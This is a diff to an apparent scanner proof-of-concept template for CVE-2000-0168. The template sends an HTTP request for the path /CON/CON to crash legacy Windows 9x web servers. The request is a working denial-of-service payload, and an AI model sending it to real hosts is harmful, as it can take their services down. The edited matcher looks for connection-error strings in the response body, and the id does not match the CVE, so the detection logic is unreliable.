@@ -1,6 +1,6 @@
 [info]
-author = "ave"
-description = "向目标 HTTP 服务发送包含 DOS 保留设备名（CON）的路径请求，若服务器崩溃无法响应则验证存在 CVE-2000-0168 设备名路径解析拒绝服务漏洞。"
+author = "AVE"
+description = "向 Windows 9x 系统发送包含保留设备名称（如 CON、NUL）的 HTTP 请求，触发系统崩溃导致拒绝服务。"
 id = "POC-AVE-2000-0148"
 name = "Microsoft Windows 设备名路径拒绝服务漏洞 PoC"
 severity = "medium"
@@ -8,6 +8,7 @@ tags = [
     "cve-2000-0168",
     "dos",
     "windows",
+    "device-name",
 ]
 vuln_id = [
     "CVE-2000-0168",
@@ -15,7 +16,7 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
@@ -23,7 +24,11 @@ path = "/{{BaseURL}}/CON/CON"
 protocol = "http"
 
 [[poc.requests.matchers]]
-expect = false
-part = "header"
+expect = true
+part = "body"
 type = "word"
-words = ["HTTP/"]
+words = [
+    "Connection reset by peer",
+    "connection refused",
+    "no route to host",
+]
